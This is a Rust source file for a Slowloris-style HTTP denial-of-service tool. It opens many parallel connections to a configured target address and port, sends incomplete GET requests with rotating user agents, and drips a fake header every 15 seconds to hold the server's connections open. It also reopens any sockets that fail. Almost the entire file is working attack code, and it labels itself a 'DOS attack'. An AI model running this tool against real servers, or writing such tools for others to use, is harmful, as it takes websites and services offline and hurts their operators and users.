extern crate pretty_env_logger;
#[macro_use] extern crate log;

use std::env;
use std::error::Error;
use rayon::prelude::*;
use openssl::ssl::{SslStream, SslMethod, SslConnector};
use std::net::{Ipv4Addr, SocketAddr, TcpStream};
use std::{thread, time};
use std::io::{Read, Write};
use rand::prelude::*;

/// List of random user agents
pub const USER_AGENTS: &[&'static str]  = &[
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    &"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    &"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    &"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    &"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    &"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    &"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    ];

/// Config of the DOS attack
pub struct Config {
    /// https toggle
    pub https: bool,
    /// Target Address
    pub addr: String,
    /// Port to attack
    pub port: u16,
    /// Use random User agents or not
    pub rand_ua: bool,
    pub socket_count: usize,
}

pub struct Lori<T> {
    /// Config of this lori instance
    config: Config,
    /// Vector of connections
    connections: Vec<T>,
}

impl Lori<TcpStream> {
    /// Create a new lori instance
    pub fn new(config: Config) -> Self {
        // Create the lori
        Lori {
            connections: Vec::with_capacity(config.socket_count),
            config,
        }
    }

    /// Creates the inital sockets of the attack
    pub fn create_sockets(&mut self) -> Result<(), Box<dyn Error>> {
        info!("Creating Initial Sockets");
        // Create inital scokets
        let mut sockets = (0..self.config.socket_count).into_par_iter().map(|i| {

            debug!("Creating Socket #{}", i);

            // Create socket
            let sock = init_socket(&self.config).unwrap();

            sock

        }).collect::<Vec<TcpStream>>();

        // Add to list
        self.connections.append(&mut sockets);

        Ok(())

    }

    pub fn attack(&mut self) -> Result<(), Box<dyn Error>> {
        info!("Starting DOS attack on {:?}", self.config.addr);

        let mut rng = rand::thread_rng();

        loop {
            info!("Sending keep-alive headers... Socket Count: {}", self.connections.len());

            let max = self.connections.len() - 1;

            for i in 0..max{
                // prevent out of bounds error
                if i >= self.connections.len() {
                    break;
                }

                // Get socket reference
                let mut s = self.connections.get(i).unwrap();

                // Generate number again
                let y: u16 = rng.gen();

                // Write to stream
                let result = s.write_all(format!("X-a: {}\r\n", y).as_bytes());
                let result = s.write_all(" ".as_bytes());

                // Remove if socket fails
                if result.is_err(){
                    trace!("Socket Error, removing...");
                    self.connections.remove(i);
                }

            }

            trace!("Sockets: {}", self.connections.len());

            let failed_socks = self.config.socket_count - self.connections.len();

            warn!("Failed Sockets: {}", failed_socks);

            let mut sockets = (0..(failed_socks)).into_par_iter().map(|i| {

                trace!("Recreating Socket...");

                // Create socket
                let sock = init_socket(&self.config).unwrap();

                sock

            }).collect::<Vec<TcpStream>>();

            // Add to list
            self.connections.append(&mut sockets);


            let delay = time::Duration::from_secs(15);

            thread::sleep(delay);

        }

        Ok(())
    }
}

fn init_socket(config: &Config) -> Result<TcpStream, Box<dyn Error>>{
    // Create stream as normal
    let mut stream: TcpStream = TcpStream::connect((&config.addr[..], config.port))?;

    let mut rng = rand::thread_rng();

    // if stream.is_ok(){
    //     log("Connected to target!", 2);
    // } else {
    //     log("Couldn't connect to target...", 1);
    // };

    // stream = stream.unwrap();

    // Use https
    // if config.https {
    //     // Create SSL Connector
    //     let mut connector = SslConnector::builder(SslMethod::tls()).unwrap().build();


    //     stream = Stream::Ssl(connector.connect("google.com", stream)?);
    // }

    let ua: &'static str;

    if config.rand_ua {
        ua = rng.choose(USER_AGENTS).unwrap();
    }
    else {
        ua = USER_AGENTS[0];
    }

    let mut rng = rand::thread_rng();

    let y: u16 = rng.gen();

    let headers = format!("GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5", y, ua);
    // let headers = format!("GET /?{} HTTP/1.1\r\n", y);

    trace!("Headers:\n{}", headers);

    // Send HTTP(S) request
    stream.write_all(headers.as_bytes())?;


    Ok(stream)
}
